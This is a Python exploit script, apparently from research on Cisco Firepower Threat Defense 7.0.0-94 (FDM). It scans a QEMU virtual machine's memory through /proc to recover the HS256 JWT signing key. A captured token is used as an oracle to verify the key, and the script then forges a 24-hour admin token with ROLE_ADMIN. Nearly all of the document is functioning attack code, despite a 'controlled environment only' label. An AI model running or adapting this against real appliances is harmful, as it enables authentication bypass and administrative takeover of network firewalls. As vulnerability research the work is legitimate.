#!/usr/bin/env python3
"""
F-FTD-106: FDM JWT Signing Key Extraction via QEMU VM RAM Scan

Target: Cisco FTD 7.0.0-94 / FDM (Firepower Device Manager)
Method: Scan QEMU guest physical memory from host via /proc/<qemu_pid>/mem
        Java 8 stores String.value as char[] in UTF-16LE — key appears as
        base64 chars interleaved with \x00 bytes.

Key signing chain:
  NGFWCache["encryptionkey64"] (String, base64)
    -> BaseEncoding.base64().decode() -> byte[16]
    -> FDMJwtBuilder.signWith(HS256, byte[])   (jjwt 0.7.0, raw byte[] form)

CONTROLLED ENVIRONMENT ONLY — sshpie/ablation

Usage:
  python3 cisco_ftd_jwt_key_extraction.py --pid <qemu_pid> --vm-ram-start 0x... --vm-ram-end 0x... --token <jwt>
"""

import argparse, os, re, sys, base64, hmac, hashlib, json, time

PAT_AES128 = re.compile(rb'(?:[A-Za-z0-9+/]\x00){22}=\x00=\x00')   # 48 bytes, AES-128
PAT_AES256 = re.compile(rb'(?:[A-Za-z0-9+/]\x00){43}=\x00')         # 88 bytes, AES-256
CACHE_KEY_UTF16 = b'e\x00n\x00c\x00r\x00y\x00p\x00t\x00i\x00o\x00n\x00k\x00e\x00y\x006\x004\x00'

CHUNK = 64 * 1024 * 1024  # 64MB


def b64url_decode(s):
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))


def oracle(key_bytes, token):
    """Return True if key_bytes is the HS256 signing key for the given JWT."""
    parts = token.split('.')
    if len(parts) != 3:
        return False
    sig = b64url_decode(parts[2])
    if len(sig) != 32:
        return False
    msg = f'{parts[0]}.{parts[1]}'.encode()
    return hmac.compare_digest(hmac.new(key_bytes, msg, hashlib.sha256).digest(), sig)


def scan(pid, ram_start, ram_end, token, verbose=False):
    fd = os.open(f'/proc/{pid}/mem', os.O_RDONLY)
    total = ram_end - ram_start
    chunks = (total + CHUNK - 1) // CHUNK
    found_key = None
    cache_hits = []
    t0 = time.time()

    for i in range(chunks):
        off = ram_start + i * CHUNK
        sz = min(CHUNK, ram_end - off)
        try:
            os.lseek(fd, off, os.SEEK_SET)
            data = os.read(fd, sz)
        except OSError:
            continue

        for m in re.finditer(CACHE_KEY_UTF16, data):
            cache_hits.append(off + m.start())
            if verbose:
                print(f'[cache_key] @ {hex(off + m.start())}', file=sys.stderr)

        for pat, nbytes, label in [(PAT_AES128, 16, 'AES128'), (PAT_AES256, 32, 'AES256')]:
            for m in pat.finditer(data):
                utf16 = m.group(0)
                b64s = utf16[0::2].decode('ascii', errors='replace')
                try:
                    key_bytes = base64.b64decode(b64s)
                except Exception:
                    continue
                if len(key_bytes) != nbytes:
                    continue
                if oracle(key_bytes, token):
                    found_key = (label, b64s, key_bytes, off + m.start())
                    os.close(fd)
                    return found_key, cache_hits

        if verbose and i % 16 == 0:
            mb = (i + 1) * CHUNK / 1024 / 1024
            rate = mb / (time.time() - t0)
            print(f'[scan] {mb:.0f}/{total//1024//1024}MB  cache_hits={len(cache_hits)}  {rate:.0f}MB/s',
                  file=sys.stderr, flush=True)

    os.close(fd)
    return None, cache_hits


def forge_token(key_bytes, jti, sub='admin', role='ROLE_ADMIN', exp_hours=24):
    now = int(time.time())
    payload = {
        'iat': now,
        'sub': sub,
        'jti': jti,
        'nbf': now,
        'exp': now + exp_hours * 3600,
        'tokenType': 'JWT_Access',
        'userRole': role,
        'origin': 'password',
        'username': sub,
    }
    b64 = lambda d: base64.urlsafe_b64encode(d).rstrip(b'=').decode()
    h = b64(json.dumps({'alg': 'HS256'}, separators=(',', ':')).encode())
    p = b64(json.dumps(payload, separators=(',', ':')).encode())
    sig = hmac.new(key_bytes, f'{h}.{p}'.encode(), hashlib.sha256).digest()
    return f'{h}.{p}.{b64(sig)}'


def main():
    ap = argparse.ArgumentParser(description='F-FTD-106: FDM JWT key extractor — CONTROLLED ENV ONLY')
    ap.add_argument('--pid', type=int, required=True, help='QEMU process PID on host')
    ap.add_argument('--vm-ram-start', required=True, help='VM RAM start address (hex, e.g. 0x752c0fe00000)')
    ap.add_argument('--vm-ram-end', required=True, help='VM RAM end address (hex)')
    ap.add_argument('--token', required=True, help='Valid FDM JWT for oracle (refresh token preferred, 43-char sig)')
    ap.add_argument('--jti', help='JTI to use in forged token (use real JTI from active session)')
    ap.add_argument('--verbose', '-v', action='store_true')
    args = ap.parse_args()

    ram_start = int(args.vm_ram_start, 16)
    ram_end = int(args.vm_ram_end, 16)

    # Validate oracle token
    parts = args.token.split('.')
    if len(parts) != 3:
        print('[!] Invalid token format', file=sys.stderr)
        sys.exit(1)
    sig_bytes = b64url_decode(parts[2])
    if len(sig_bytes) != 32:
        print(f'[!] Token sig is {len(sig_bytes)} bytes (need 32) — token likely corrupted; use refresh token',
              file=sys.stderr)
        sys.exit(1)
    print(f'[+] Oracle token: sig={len(sig_bytes)}B sub={parts[1][:30]}...')

    print(f'[*] Scanning {(ram_end - ram_start)//1024//1024}MB of VM RAM (PID {args.pid})')
    result, cache_hits = scan(args.pid, ram_start, ram_end, args.token, args.verbose)

    if cache_hits:
        print(f'[+] NGFWCache "encryptionkey64" string found at: {[hex(a) for a in cache_hits]}')
    else:
        print('[!] NGFWCache "encryptionkey64" not found (key might be raw bytes only)')

    if result:
        label, b64s, key_bytes, addr = result
        print(f'\n[!!!] KEY FOUND ({label})')
        print(f'  base64:  {b64s}')
        print(f'  hex:     {key_bytes.hex()}')
        print(f'  address: {hex(addr)}')

        if args.jti:
            forged = forge_token(key_bytes, args.jti)
            print(f'\n[+] Forged admin JWT (jti={args.jti}, 24h exp):')
            print(f'  {forged}')
            print('\n[!] JTI NOTE: FDM validates JTI server-side. Use a real JTI from an active session.')
    else:
        print('[!] Key not found in VM RAM')
        if cache_hits:
            print(f'    Cache key hit at {[hex(a) for a in cache_hits]} — try scanning ±100MB window around those addresses')
        sys.exit(1)


if __name__ == '__main__':
    main()
